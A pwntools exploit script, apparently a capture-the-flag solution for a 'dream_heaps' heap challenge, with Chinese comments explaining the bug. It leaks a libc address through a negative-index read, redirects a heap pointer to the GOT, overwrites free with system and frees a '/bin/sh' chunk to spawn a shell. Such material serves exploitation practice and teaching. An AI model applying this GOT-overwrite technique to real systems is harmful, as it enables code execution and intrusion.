'''
Author: Samrito
Date: 2022-02-28 17:04:18
LastEditors: Samrito
LastEditTime: 2022-02-28 19:42:17
'''
'''
HEAP_PTR每次增长8 bytes， SIZES每次增长4 bytes， new_dream中程序首先修改HEAP_PTR数组加入buf地址，再修改SIZES
，因此可以在SIZES落后于HEAP_PTR后通过SIZES修改HEAP_PTR数组中buf地址为got表地址，再通过edit_dream函数修改其值
'''
from multiprocessing.connection import wait
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'


def debug(argv=''):
    gdb.attach(io, argv)
    pause()


def menu(id):
    io.recvuntil(b'> ')
    io.sendline(id)


def new_dream(dream, size):
    menu(b'1')
    io.recvuntil(b'How long is your dream?\n')
    io.sendline(size)
    io.recvuntil(b'What are the contents of this dream?\n')
    io.send(dream)


def read_dream(index):
    #read_dream只检查上限，因此能够读到负数对应内存
    menu(b'2')
    io.recvuntil(b'Which dream would you like to read?\n')
    io.sendline(index)


def edit_dream(index, ndream):
    menu(b'3')
    io.recvuntil(b'Which dream would you like to change?\n')
    io.sendline(index)
    io.send(ndream)


def delete_dream(index):
    menu(b'4')
    io.recvuntil(b'Which dream would you like to delete?\n')
    io.sendline(index)


io = process(argv=['./dream_heaps'])
#0x400538 -> 0x602020(.got.plt) -> 0x7ffff7a649c0(puts_addr)
#(0x6020a0 - 0x400538) / 8 = 263021
libc = ELF('./libc-2.27.so')
read_dream(b'-263021')
res = io.recvline()
puts_addr = res.split(b'W')[0]
puts_addr = u64(puts_addr.ljust(8, b'\x00'))
libc_base = puts_addr - libc.symbols['puts']
log.info('libc base is ' + hex(libc_base))
new_dream(b'/bin/sh\x00', b'10')
for i in range(1, 18):
    new_dream(b'\x00', b'100')
    print('################' + str(i))
new_dream(b'\x00', b'6299672')  #0x602018 free got addr
ndream = flat([libc_base + libc.symbols['system']])
edit_dream(b'17', ndream)
delete_dream(b'0')
io.interactive()
